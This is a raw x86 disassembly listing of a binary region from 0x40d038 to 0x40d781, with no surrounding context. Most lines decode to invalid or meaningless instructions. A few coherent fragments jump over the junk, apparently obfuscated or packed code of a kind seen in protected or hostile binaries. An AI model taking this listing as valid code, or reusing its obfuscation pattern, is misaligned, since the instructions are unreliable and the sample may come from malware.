  40d038:	or     eax,DWORD PTR [ebx]
  40d03a:	bound  edx,QWORD PTR [ebx+0x6e7b615e]
  40d040:	xchg   esi,eax
  40d041:	ret    0x5830
  40d044:	mov    BYTE PTR [ebx+0x60],bh
  40d047:	push   ds
  40d048:	cwde   
  40d049:	jo     0x40d048
  40d04b:	xchg   edi,eax
  40d04c:	(bad)  
  40d04d:	mov    WORD PTR [edi],?
  40d04f:	mov    edi,0x3579517e
  40d054:	fs out dx,eax
  40d056:	nop
  40d057:	aad    0xbc
  40d059:	and    DWORD PTR [ebp-0x4dc3a24f],esi
  40d05f:	out    0xa3,al
  40d061:	sbb    DWORD PTR [esp+edi*4],edi
  40d064:	mov    BYTE PTR [edi+0x1cd590a1],bh
  40d06a:	jle    0x40d0b6
  40d06c:	retf   0x7db0
  40d06f:	repnz (bad) 
  40d071:	jle    0x40d07f
  40d073:	shr    DWORD PTR [ecx-0x26],1
  40d076:	pop    es
  40d077:	pop    ds
  40d078:	mov    al,0x74
  40d07a:	icebp  
  40d07b:	hlt    
  40d07c:	loope  0x40d0bb
  40d07e:	out    dx,al
  40d07f:	cmp    eax,0x609634fc
  40d084:	xchg   DWORD PTR [ebp+0xc23fc41],edi
  40d08a:	int    0x64
  40d08c:	push   cs
  40d08d:	inc    edx
  40d08e:	push   ss
  40d08f:	outs   dx,DWORD PTR ds:[esi]
  40d090:	and    DWORD PTR [eax+0x7ca288d3],0x4dba27a0
  40d09a:	mov    edx,0xf3b5333a
  40d09f:	jp     0x40d0fc
  40d0a1:	sub    eax,0xa53afd86
  40d0a6:	mov    esi,0xc23a841e
  40d0ab:	cmp    BYTE PTR [edx+0x30],0xba
  40d0af:	bound  ebx,QWORD PTR [esi]
  40d0b1:	lods   al,BYTE PTR ds:[esi]
  40d0b2:	or     BYTE PTR [edi],bh
  40d0b4:	mov    dl,0xf5
  40d0b6:	ror    BYTE PTR [edi-0x353d9282],0xb9
  40d0bd:	jo     0x40d0c1
  40d0bf:	mov    edi,0xf62965c
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebp,FWORD PTR [ecx-0x555028b2]
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0ec
  40d0fb:	data16 jg 0x40d0ec
  40d0fe:	repnz pop ds
  40d100:	mov    ah,0xb7
  40d102:	sub    bl,BYTE PTR [esi-0x68]
  40d105:	ficomp WORD PTR [edx-0x6db5eed9]
  40d10b:	add    DWORD PTR [ebx-0x18],ecx
  40d10e:	outs   dx,BYTE PTR ds:[esi]
  40d10f:	cdq    
  40d110:	ds xchg ecx,eax
  40d112:	mov    edi,DWORD PTR [eax+0x4cf62301]
  40d118:	mov    ebx,0x83cb883d
  40d11d:	sar    edx,1
  40d11f:	push   ecx
  40d120:	push   0x37
  40d122:	inc    ebp
  40d123:	(bad)  
  40d124:	jno    0x40d14e
  40d126:	xor    al,0x3f
  40d128:	pop    ebx
  40d129:	dec    esi
  40d12a:	pop    ecx
  40d12b:	push   eax
  40d12c:	dec    eax
  40d12d:	or     al,0xbc
  40d12f:	push   edi
  40d130:	pop    edx
  40d131:	xchg   esp,eax
  40d132:	pop    esp
  40d133:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d135:	jns    0x40d0b9
  40d137:	ins    BYTE PTR es:[edi],dx
  40d138:	add    dl,BYTE PTR [edi+0x37f870b6]
  40d13e:	jb     0x40d12d
  40d140:	or     bh,bh
  40d142:	push   ss
  40d143:	mov    bh,0x3e
  40d145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d146:	jp     0x40d174
  40d148:	fadd   QWORD PTR ds:0xb0d0db39
  40d14e:	mov    edx,ebp
  40d150:	xlat   BYTE PTR ds:[ebx]
  40d151:	lds    ecx,FWORD PTR [edx]
  40d153:	pop    ss
  40d154:	in     eax,dx
  40d155:	xor    ecx,ebp
  40d157:	arpl   di,bx
  40d159:	jae    0x40d1ab
  40d15b:	jb     0x40d19c
  40d15d:	test   DWORD PTR [ebp-0x3c],esi
  40d160:	mov    ecx,0x556c3944
  40d165:	mov    eax,ds:0x626c01cd
  40d16a:	inc    esp
  40d16b:	jmp    0xf5b1:0xf8e356c6
  40d172:	stc    
  40d173:	outs   dx,BYTE PTR ds:[esi]
  40d174:	xchg   ecx,eax
  40d175:	(bad)  [edi+0x42dd4d02]
  40d17b:	sbb    DWORD PTR [edx-0x32204fa5],esp
  40d181:	adc    edi,DWORD PTR [esi+ebp*1]
  40d184:	dec    edi
  40d185:	mov    ds:0x591930d5,al
  40d18a:	hlt    
  40d18b:	jo     0x40d1f0
  40d18d:	mov    edi,0xf2e74f76
  40d192:	push   ebp
  40d193:	pop    ecx
  40d194:	ins    BYTE PTR es:[edi],dx
  40d195:	xchg   esp,edi
  40d197:	pop    eax
  40d198:	or     ah,dl
  40d19a:	push   ebp
  40d19b:	in     al,dx
  40d19c:	in     al,0xcb
  40d19e:	ret    0xacee
  40d1a1:	into   
  40d1a2:	and    edi,DWORD PTR [edi-0x7519ad1]
  40d1a8:	inc    esi
  40d1a9:	push   ecx
  40d1aa:	dec    ecx
  40d1ab:	outs   dx,BYTE PTR ds:[esi]
  40d1ac:	add    BYTE PTR [edi+0x2c9d3255],ah
  40d1b2:	(bad)  
  40d1b3:	push   ds
  40d1b4:	ret    0x6c2
  40d1b7:	push   ebp
  40d1b8:	jecxz  0x40d229
  40d1ba:	(bad)  
  40d1bb:	and    al,0x76
  40d1bd:	clc    
  40d1be:	loop   0x40d1be
  40d1c0:	fdivr  QWORD PTR [edx]
  40d1c2:	imul   ebx,DWORD PTR [ebp+0x2778f337],0x4
  40d1c9:	or     eax,DWORD PTR [esi]
  40d1cb:	in     eax,0x89
  40d1cd:	mov    ch,0xd5
  40d1cf:	dec    eax
  40d1d0:	int3   
  40d1d1:	push   ecx
  40d1d2:	jp     0x40d21e
  40d1d4:	fs out dx,al
  40d1d6:	enter  0xa80f,0x90
  40d1da:	xlat   BYTE PTR ds:[ebx]
  40d1db:	cld    
  40d1dc:	sahf   
  40d1dd:	sar    bh,cl
  40d1df:	(bad)  
  40d1e0:	sub    DWORD PTR [esp+ebp*8-0x1553537a],ecx
  40d1e7:	iret   
  40d1e8:	jecxz  0x40d172
  40d1ea:	ja     0x40d1e3
  40d1ec:	jl     0x40d1f6
  40d1ee:	jle    0x40d1f7
  40d1f0:	iret   
  40d1f1:	sar    BYTE PTR [esp+ecx*4],1
  40d1f4:	mov    esi,0xcde7a969
  40d1f9:	sub    edi,DWORD PTR [edi]
  40d1fb:	cmp    ebp,DWORD PTR [ecx-0x26]
  40d1fe:	and    DWORD PTR [ebx+0x3d],ebx
  40d201:	xor    DWORD PTR [edx+0x7a],ebx
  40d204:	repnz inc edx
  40d206:	mov    ebx,0x59b9d77b
  40d20b:	dec    esi
  40d20c:	push   0xffffffc0
  40d20e:	test   eax,0x209797a6
  40d213:	bound  edi,QWORD PTR [eax-0x23]
  40d216:	mov    ch,bl
  40d218:	clc    
  40d219:	fwait
  40d21a:	loop   0x40d1f1
  40d21c:	daa    
  40d21d:	cmp    eax,0xf4e71b6a
  40d223:	cli    
  40d224:	push   eax
  40d225:	(bad)  
  40d226:	push   eax
  40d227:	dec    ebx
  40d228:	adc    BYTE PTR [ebp+edi*8+0x69],bl
  40d22c:	jnp    0x40d235
  40d22e:	pop    ds
  40d22f:	out    0x66,eax
  40d231:	out    dx,al
  40d232:	not    BYTE PTR [ebx+edi*8-0x4e]
  40d236:	jnp    0x40d22b
  40d238:	mov    bh,0x63
  40d23a:	add    DWORD PTR ds:0x79cbe092,esi
  40d240:	shl    DWORD PTR [edi],0xe0
  40d243:	sti    
  40d244:	pop    ds
  40d245:	or     ch,cl
  40d247:	popa   
  40d248:	rcl    DWORD PTR [ebx+0x1c46d22d],1
  40d24e:	rcl    ebx,cl
  40d250:	shl    dh,0x9c
  40d253:	aam    0xb7
  40d255:	ja     0x207caea6
  40d25b:	mov    bh,al
  40d25d:	sbb    al,0xe0
  40d25f:	leave  
  40d260:	mov    DWORD PTR ds:0x42b30656,ecx
  40d266:	shr    DWORD PTR [ebx-0x13],cl
  40d269:	in     al,0x7a
  40d26b:	ds push ebp
  40d26d:	ss pop edx
  40d26f:	and    al,0x9b
  40d271:	mov    ebx,DWORD PTR [eax+0x7c0c8bb4]
  40d277:	cdq    
  40d278:	aaa    
  40d279:	pop    es
  40d27a:	pushf  
  40d27b:	sbb    BYTE PTR [edi],bl
  40d27d:	fistp  DWORD PTR ds:0x6d55e891
  40d283:	cli    
  40d284:	mov    esi,0x2ae0c917
  40d289:	stc    
  40d28a:	sti    
  40d28b:	lds    eax,FWORD PTR [ebx-0x49]
  40d28e:	ins    BYTE PTR es:[edi],dx
  40d28f:	popa   
  40d290:	dec    ebx
  40d291:	ins    BYTE PTR es:[edi],dx
  40d292:	pop    ebx
  40d293:	dec    ecx
  40d294:	xor    DWORD PTR [edx+0x567d1e17],eax
  40d29a:	jmp    0x40d257
  40d29c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40d29e:	int    0x77
  40d2a0:	mov    al,0x5f
  40d2a2:	test   al,0x38
  40d2a4:	test   DWORD PTR [esi+ebp*8],0x37cb32ad
  40d2ab:	or     bl,cl
  40d2ad:	sub    eax,0xf5897515
  40d2b2:	stc    
  40d2b3:	sub    eax,0xb370fb73
  40d2b8:	sub    al,0xd3
  40d2ba:	dec    ecx
  40d2bb:	jne    0x40d286
  40d2bd:	and    eax,0x8af9ac03
  40d2c2:	scas   eax,DWORD PTR es:[edi]
  40d2c3:	add    BYTE PTR [edx+0x3fc1edf6],bh
  40d2c9:	push   eax
  40d2ca:	inc    ebp
  40d2cb:	jmp    edx
  40d2cd:	loope  0x40d2dd
  40d2cf:	shr    DWORD PTR [ebp+0x57],0x92
  40d2d3:	sub    eax,0x62060e1c
  40d2d8:	pusha  
  40d2d9:	mov    DWORD PTR ss:[ebp+0x49150e3],esp
  40d2e0:	jmp    0x62a2:0xdb5470ca
  40d2e7:	shr    BYTE PTR [ebx-0x2969ba2e],cl
  40d2ed:	mov    ch,0xa7
  40d2ef:	std    
  40d2f0:	sub    eax,0xe1002cd3
  40d2f5:	or     al,0x25
  40d2f7:	mov    cl,BYTE PTR [esi+eax*2]
  40d2fa:	lods   eax,DWORD PTR ds:[esi]
  40d2fb:	outs   dx,DWORD PTR ds:[esi]
  40d2fc:	inc    edi
  40d2fd:	xchg   esp,eax
  40d2fe:	pop    ss
  40d2ff:	fisttp QWORD PTR [ecx+0x64]
  40d302:	dec    eax
  40d303:	mov    bh,BYTE PTR [edx+0x67]
  40d306:	js     0x40d28f
  40d308:	cmp    ch,BYTE PTR [ecx+esi*1+0x32]
  40d30c:	arpl   WORD PTR [edx+ecx*4-0x22],cx
  40d310:	dec    edi
  40d311:	dec    ebp
  40d312:	leave  
  40d313:	shr    ecx,1
  40d315:	shl    DWORD PTR [esi+0x49562dff],cl
  40d31b:	or     DWORD PTR [esi+0x6c],ebp
  40d31e:	ret    0x8f57
  40d321:	mov    eax,0x3412802b
  40d326:	dec    esi
  40d327:	aas    
  40d328:	mov    ebp,0x28f206b0
  40d32d:	mov    BYTE PTR [ebp+ebp*4+0x29],dh
  40d331:	daa    
  40d332:	pushf  
  40d333:	sub    DWORD PTR [esi],ebp
  40d335:	aas    
  40d336:	cdq    
  40d337:	aaa    
  40d338:	push   edx
  40d339:	dec    ecx
  40d33a:	xchg   BYTE PTR [ebx+0x7c],ch
  40d33d:	pusha  
  40d33e:	pop    esi
  40d33f:	arpl   WORD PTR ds:[eax-0x75],di
  40d343:	(bad)  
  40d344:	or     DWORD PTR [esi+ecx*2],eax
  40d347:	xchg   esp,eax
  40d348:	sub    DWORD PTR ds:0xe6c3b3ba,ebx
  40d34e:	pop    ss
  40d34f:	mov    edi,0x7b0e54b6
  40d354:	int    0x1e
  40d356:	xor    ebp,DWORD PTR [ebx]
  40d358:	sbb    BYTE PTR ds:0xd2ebfe1e,dl
  40d35e:	imul   ebp
  40d360:	pop    esp
  40d361:	pusha  
  40d362:	lea    ebp,[edx]
  40d364:	sub    ecx,DWORD PTR [eax-0x448b07ab]
  40d36a:	or     DWORD PTR [esi],edi
  40d36c:	(bad)  
  40d36d:	in     al,dx
  40d36e:	ja     0x40d316
  40d370:	sub    ecx,ebx
  40d372:	xor    eax,0x555014ec
  40d377:	push   ss
  40d378:	dec    eax
  40d379:	jb     0x40d375
  40d37b:	xor    bl,BYTE PTR [edx+0x2a4cb004]
  40d381:	cmp    BYTE PTR [edi+0x68ca3dc2],0x18
  40d388:	inc    ecx
  40d389:	mov    edi,0x80567097
  40d38e:	hlt    
  40d38f:	popf   
  40d390:	adc    al,0x32
  40d392:	(bad)  
  40d393:	jb     0x40d3ad
  40d395:	inc    esp
  40d396:	cmp    BYTE PTR [ebx],0x9f
  40d399:	jecxz  0x40d3bf
  40d39b:	mov    al,0x22
  40d39d:	sub    eax,0xdfc62fe
  40d3a2:	shl    dl,0xa7
  40d3a5:	jae    0x40d364
  40d3a7:	inc    esi
  40d3a8:	scas   eax,DWORD PTR es:[edi]
  40d3a9:	icebp  
  40d3aa:	or     eax,0xa60b600d
  40d3af:	jmp    0x40d39b
  40d3b1:	in     eax,dx
  40d3b2:	ds mov dl,0x99
  40d3b5:	push   edi
  40d3b6:	fsubrp st(7),st
  40d3b8:	fmul   st,st(1)
  40d3ba:	dec    edx
  40d3bb:	jno    0x40d385
  40d3bd:	(bad)  
  40d3be:	arpl   WORD PTR [edi-0x21],ax
  40d3c1:	enter  0x3680,0xb5
  40d3c5:	cmp    al,0x49
  40d3c7:	jg     0x40d439
  40d3c9:	jge    0x40d36d
  40d3cb:	inc    ebp
  40d3cc:	lahf   
  40d3cd:	push   esi
  40d3ce:	mov    DWORD PTR [edi-0xc],esi
  40d3d1:	mov    al,0xbb
  40d3d3:	pop    edx
  40d3d4:	cwde   
  40d3d5:	push   ds
  40d3d6:	cmp    BYTE PTR [ebp+0x718863c0],bh
  40d3dc:	cwde   
  40d3dd:	js     0x40d41e
  40d3df:	js     0x40d3e5
  40d3e1:	mov    esp,0xcd18b503
  40d3e6:	inc    ebx
  40d3e7:	stc    
  40d3e8:	xchg   ecx,eax
  40d3e9:	mov    esi,0xfc973ece
  40d3ee:	pop    esi
  40d3ef:	in     eax,0xe4
  40d3f1:	in     eax,dx
  40d3f2:	push   edx
  40d3f3:	mov    al,ds:0xb9163621
  40d3f8:	mov    al,ds:0x30495025
  40d3fd:	push   ebx
  40d3fe:	lds    ebx,FWORD PTR [ecx-0x37212dcd]
  40d404:	mov    bh,0xf9
  40d406:	push   edi
  40d407:	popa   
  40d408:	fwait
  40d409:	xchg   esi,eax
  40d40a:	ins    DWORD PTR es:[edi],dx
  40d40b:	add    al,0x7f
  40d40d:	push   esp
  40d40e:	es int3 
  40d410:	in     al,0xb5
  40d412:	outs   dx,DWORD PTR ds:[esi]
  40d413:	es out 0x10,al
  40d416:	mov    edx,0xe2f99849
  40d41b:	xchg   esi,eax
  40d41c:	mov    dl,0x10
  40d41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d41f:	jns    0x40d3f0
  40d421:	iret   
  40d422:	loope  0x40d3d3
  40d424:	xchg   ebp,eax
  40d425:	adc    DWORD PTR [ebx],esi
  40d427:	xor    bl,BYTE PTR [edi]
  40d429:	(bad)  
  40d42a:	ror    BYTE PTR [ecx+ebx*8-0x4],1
  40d42e:	sub    edi,DWORD PTR [eax]
  40d430:	xchg   esp,eax
  40d431:	loope  0x40d4ae
  40d433:	(bad)  
  40d434:	jmp    0x40d3d7
  40d436:	mov    ah,0x0
  40d438:	xchg   esi,eax
  40d439:	es adc al,0x71
  40d43c:	addr16 xchg edx,eax
  40d43e:	(bad)  
  40d43f:	lods   eax,DWORD PTR ds:[esi]
  40d440:	inc    ecx
  40d441:	pop    ebp
  40d442:	aad    0x9e
  40d444:	leave  
  40d445:	adc    BYTE PTR gs:[edi+0x7f],al
  40d449:	mov    dl,0x9c
  40d44b:	mov    edx,0xa34dd2e0
  40d450:	adc    al,0x7a
  40d452:	mov    ds:0x6e6d7e1a,eax
  40d457:	shl    DWORD PTR [ecx+0x56],0x40
  40d45b:	sahf   
  40d45c:	fstp   DWORD PTR [edx+0x54ea40df]
  40d462:	ficomp WORD PTR [edi+0x264fedc]
  40d468:	fimul  DWORD PTR [ebx-0x58843509]
  40d46e:	pop    ds
  40d46f:	scas   eax,DWORD PTR es:[edi]
  40d470:	sbb    al,0xe6
  40d472:	mov    ebp,0xea46c04a
  40d477:	pop    edx
  40d478:	mov    BYTE PTR [edi+ebx*2+0x5437cdc3],dh
  40d47f:	mov    DWORD PTR [eax],ebx
  40d481:	xchg   ecx,eax
  40d482:	lock xchg BYTE PTR [esi+0x6a],ah
  40d486:	cli    
  40d487:	mov    ecx,0xfd08db3
  40d48c:	inc    esp
  40d48d:	pop    ecx
  40d48e:	in     eax,0xeb
  40d490:	clc    
  40d491:	pop    ebx
  40d492:	or     DWORD PTR [esi+0x7c],eax
  40d495:	mov    dh,0x5a
  40d497:	push   ebx
  40d498:	lods   eax,DWORD PTR ds:[esi]
  40d499:	ss in  eax,dx
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x4ad3:0xb81a1d63
  40d4c6:	push   cs
  40d4c7:	dec    ecx
  40d4c8:	and    ecx,ecx
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d46a
  40d4d2:	mov    al,BYTE PTR [ebx+0x5fcc785d]
  40d4d8:	nop
  40d4d9:	aam    0x64
  40d4db:	sub    ch,bl
  40d4dd:	mov    WORD PTR [eax-0x7f6ddadc],ss
  40d4e3:	les    edi,FWORD PTR [edi]
  40d4e5:	xchg   esi,eax
  40d4e6:	ds (bad) 
  40d4e8:	repnz push ebp
  40d4ea:	in     eax,0x40
  40d4ec:	sbb    DWORD PTR [ecx],edi
  40d4ee:	or     al,0xbf
  40d4f0:	in     eax,dx
  40d4f1:	cli    
  40d4f2:	and    esi,DWORD PTR [eax+esi*1-0x49ae609d]
  40d4f9:	pushf  
  40d4fa:	out    dx,eax
  40d4fb:	ret    0x302a
  40d4fe:	xor    DWORD PTR [edx+edx*2+0x2f],0xaf66663
  40d506:	les    ebp,FWORD PTR [ebp-0x64]
  40d509:	mov    eax,ds:0x37eb44e9
  40d50e:	mov    WORD PTR [ecx+0x779dbed1],?
  40d514:	mov    esp,0x96bf2dd
  40d519:	mov    BYTE PTR [edi+0x69],dl
  40d51c:	and    DWORD PTR [ebx],edi
  40d51e:	or     ecx,DWORD PTR [esi]
  40d520:	mov    al,ds:0x1b663df8
  40d525:	in     al,dx
  40d526:	sub    BYTE PTR [ebx],cl
  40d528:	jbe    0x40d596
  40d52a:	jp     0x40d526
  40d52c:	or     BYTE PTR [ebx+0x37],ch
  40d52f:	push   esp
  40d530:	mov    WORD PTR [ebx],ds
  40d532:	sbb    BYTE PTR [ebx-0x5612d638],0xa2
  40d539:	jo     0x40d5ad
  40d53b:	or     cl,al
  40d53d:	xchg   edi,eax
  40d53e:	js     0x40d4fc
  40d540:	fwait
  40d541:	dec    eax
  40d542:	call   DWORD PTR [edx-0x48]
  40d545:	scas   al,BYTE PTR es:[edi]
  40d546:	and    ebp,DWORD PTR [eax]
  40d548:	pop    ebp
  40d549:	fsubp  st(7),st
  40d54b:	sbb    al,0xc5
  40d54d:	aad    0x52
  40d54f:	jbe    0x40d596
  40d551:	rcl    dl,0x5a
  40d554:	sbb    eax,0xda08a2a6
  40d559:	sub    esi,ecx
  40d55b:	imul   ecx,DWORD PTR [ebp+esi*4-0x64e5c055],0xffffffb8
  40d563:	(bad)  
  40d564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d565:	nop
  40d566:	inc    edi
  40d567:	jmp    0xcb9:0xa5d17f89
  40d56e:	dec    ebp
  40d56f:	(bad)  
  40d570:	sahf   
  40d571:	les    eax,FWORD PTR [esi+esi*2]
  40d574:	and    edx,DWORD PTR [ecx]
  40d576:	xor    bh,BYTE PTR [edi+0x55]
  40d579:	pop    esp
  40d57a:	in     al,0xb5
  40d57c:	mov    dl,0x75
  40d57e:	fcomp  DWORD PTR [edx-0x2d]
  40d581:	mov    eax,ds:0x67d81e68
  40d586:	icebp  
  40d587:	es jno 0x40d56f
  40d58a:	retf   
  40d58b:	xor    eax,0x6d5af219
  40d590:	nop
  40d591:	and    al,BYTE PTR [eax+0x4f652823]
  40d597:	dec    ebp
  40d598:	adc    ah,BYTE PTR [ebx+0x2]
  40d59b:	in     al,dx
  40d59c:	fwait
  40d59d:	cmp    eax,0xeccf7b02
  40d5a2:	in     eax,0xe5
  40d5a4:	dec    edx
  40d5a5:	(bad)  
  40d5a6:	sub    al,0x56
  40d5a8:	mov    cl,0x60
  40d5aa:	(bad)  
  40d5ab:	mov    eax,ds:0x9377248c
  40d5b0:	test   al,0x21
  40d5b2:	sti    
  40d5b3:	and    esp,DWORD PTR [edi+ecx*8+0x29]
  40d5b7:	and    DWORD PTR [edx-0x6ef69371],edx
  40d5bd:	sbb    eax,0x30bd1d30
  40d5c2:	push   eax
  40d5c3:	jno    0x40d551
  40d5c5:	jb     0x40d59e
  40d5c7:	ror    BYTE PTR [ecx-0x44],0xc5
  40d5cb:	fcomp  DWORD PTR [edx-0x6e0de151]
  40d5d1:	and    BYTE PTR [esi+0xb],ah
  40d5d4:	push   eax
  40d5d5:	call   0x945f:0x6442a175
  40d5dc:	push   ebp
  40d5dd:	mov    eax,ds:0xf2d46ca6
  40d5e2:	ds scas eax,DWORD PTR es:[edi]
  40d5e4:	ins    BYTE PTR es:[edi],dx
  40d5e5:	test   al,0xa0
  40d5e7:	push   edi
  40d5e8:	int3   
  40d5e9:	adc    ch,BYTE PTR [edx-0x31e9fa39]
  40d5ef:	jbe    0x40d631
  40d5f1:	fisubr WORD PTR [ebx]
  40d5f3:	xchg   BYTE PTR [esi+esi*2+0x17],ch
  40d5f7:	inc    esi
  40d5f8:	add    al,0x2f
  40d5fa:	xchg   ecx,eax
  40d5fb:	jne    0x40d5ee
  40d5fd:	out    0x97,eax
  40d5ff:	jae    0x40d67e
  40d601:	xor    DWORD PTR [edx+0x71],ebp
  40d604:	stos   DWORD PTR es:[edi],eax
  40d605:	mov    ebp,0x868197eb
  40d60a:	mov    ds:0x3a634d74,eax
  40d60f:	inc    eax
  40d610:	js     0x40d5d3
  40d612:	sbb    ch,BYTE PTR [ebp-0x2e25da8e]
  40d618:	les    esp,FWORD PTR [esi+esi*4]
  40d61b:	sub    esp,DWORD PTR [ecx]
  40d61d:	bound  edi,QWORD PTR [esi]
  40d61f:	and    DWORD PTR [ebp-0x68],ebx
  40d622:	cmp    al,0x29
  40d624:	nop
  40d625:	in     al,0x5f
  40d627:	sub    al,0x2b
  40d629:	pushf  
  40d62a:	retf   
  40d62b:	dec    ebp
  40d62c:	mov    ebp,0xd2b95029
  40d631:	hlt    
  40d632:	inc    ebp
  40d633:	pusha  
  40d634:	adc    eax,0x58e2a516
  40d639:	or     BYTE PTR [eax],0x99
  40d63c:	daa    
  40d63d:	mov    dl,0xbd
  40d63f:	int    0xa5
  40d641:	dec    esi
  40d642:	ins    DWORD PTR es:[edi],dx
  40d643:	jecxz  0x40d6a6
  40d645:	test   al,0xae
  40d647:	repnz sub BYTE PTR [esi+0x42],ch
  40d64b:	into   
  40d64c:	pop    ecx
  40d64d:	fs mov bh,0xae
  40d650:	and    al,0x9d
  40d652:	mov    al,dh
  40d654:	lds    edi,FWORD PTR [ebx+ecx*2+0x65]
  40d658:	push   eax
  40d659:	scas   al,BYTE PTR es:[edi]
  40d65a:	inc    edx
  40d65b:	sub    BYTE PTR [edx],dh
  40d65d:	add    al,0x87
  40d65f:	add    BYTE PTR [eax-0x2f5abae0],al
  40d665:	dec    esi
  40d666:	pop    esp
  40d667:	pop    ebp
  40d668:	(bad)  
  40d669:	pop    esp
  40d66a:	and    esp,edx
  40d66c:	arpl   WORD PTR [ebx],bp
  40d66e:	mov    bl,0x73
  40d670:	int3   
  40d671:	imul   edx,DWORD PTR [eax+edx*1],0xe194a9db
  40d678:	sbb    eax,0x176b462f
  40d67d:	inc    ecx
  40d67e:	add    BYTE PTR [esi-0x71cb4e92],0x70
  40d685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d686:	add    dl,dl
  40d688:	clc    
  40d689:	(bad)  
  40d68a:	mov    ebx,0xb1bfca62
  40d68f:	stos   DWORD PTR es:[edi],eax
  40d690:	push   ebp
  40d691:	sub    DWORD PTR [edx+0x5f],0xf
  40d695:	push   edx
  40d696:	bound  esp,QWORD PTR [edi+0x11]
  40d699:	ds sti 
  40d69b:	int    0x21
  40d69d:	push   esi
  40d69e:	inc    ecx
  40d69f:	dec    ebp
  40d6a0:	outs   dx,BYTE PTR ds:[esi]
  40d6a1:	push   ebp
  40d6a2:	add    bl,ch
  40d6a4:	add    al,BYTE PTR [edx]
  40d6a6:	(bad)  
  40d6a7:	cmp    eax,0xf1e43058
  40d6ac:	cmp    ah,BYTE PTR [ecx+eiz*4]
  40d6af:	pop    eax
  40d6b0:	mov    ds:0x9981eed5,al
  40d6b5:	cmp    ebx,DWORD PTR [ecx]
  40d6b7:	adc    BYTE PTR [edx-0x2ad34fb3],0x4e
  40d6be:	test   DWORD PTR [esi+0x37],esp
  40d6c1:	aas    
  40d6c2:	fisttp DWORD PTR [edx+0x5e]
  40d6c5:	fsub   QWORD PTR [ecx+0x70d1ad2c]
  40d6cb:	add    ebx,DWORD PTR [ebx-0x4]
  40d6ce:	ror    DWORD PTR [edx+0x59],cl
  40d6d1:	pushf  
  40d6d2:	mov    ds:0xbbc5a83e,al
  40d6d7:	jno    0x40d755
  40d6d9:	push   eax
  40d6da:	stc    
  40d6db:	ret    0x1b78
  40d6de:	push   edi
  40d6df:	sahf   
  40d6e0:	fwait
  40d6e1:	addr16 inc edi
  40d6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e4:	test   DWORD PTR [ebx+0x84c51c],ebx
  40d6ea:	bound  ecx,QWORD PTR [ebp+edi*1-0x577d0d7d]
  40d6f1:	cli    
  40d6f2:	push   es
  40d6f3:	stos   BYTE PTR es:[edi],al
  40d6f4:	adc    DWORD PTR ds:0xffeec09c,ebp
  40d6fa:	or     al,0x19
  40d6fc:	stc    
  40d6fd:	in     al,dx
  40d6fe:	dec    edx
  40d6ff:	add    eax,0x9be24ccf
  40d704:	adc    al,0xf5
  40d706:	cmp    bl,BYTE PTR [esi]
  40d708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d709:	clc    
  40d70a:	in     al,0x45
  40d70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d70d:	or     BYTE PTR [eax+eiz*8-0x58befcec],ch
  40d714:	sub    eax,0x2501d6e6
  40d719:	jbe    0x40d79a
  40d71b:	xchg   ecx,eax
  40d71c:	adc    DWORD PTR [esi+edx*2+0x58bea7e9],0x1d
  40d724:	je     0x40d6b4
  40d726:	aas    
  40d727:	(bad)  
  40d728:	out    dx,al
  40d729:	fmul   DWORD PTR ds:0x283d44a0
  40d72f:	sbb    ecx,ebx
  40d731:	hlt    
  40d732:	call   0x4d3a65c
  40d737:	ficom  WORD PTR [ebp-0x5ed200b]
  40d73d:	xor    al,0x5c
  40d73f:	dec    ebx
  40d740:	punpcklwd mm4,DWORD PTR [edx-0x75]
  40d744:	js     0x40d75b
  40d746:	mov    edx,0xd03c1c19
  40d74b:	lahf   
  40d74c:	test   DWORD PTR [eax],0xb790c7f8
  40d752:	ficomp WORD PTR [ebp-0x9]
  40d755:	out    dx,eax
  40d756:	retf   
  40d757:	out    0xc9,eax
  40d759:	(bad)  
  40d75a:	jmp    0x40d760
  40d75c:	out    0xac,eax
  40d75e:	sub    al,0x58
  40d760:	xor    al,0xd0
  40d762:	or     esp,ebp
  40d764:	aas    
  40d765:	dec    eax
  40d766:	js     0x40d6ff
  40d768:	or     ch,BYTE PTR [edx-0x60]
  40d76b:	mov    eax,0x8647b2ab
  40d770:	std    
  40d771:	les    edi,FWORD PTR ds:0x53e27a62
  40d777:	mov    fs:0xc94062bf,al
  40d77d:	pop    ebp
  40d77e:	pop    esp
  40d77f:	jg     0x40d74f
  40d781:	(bad)  
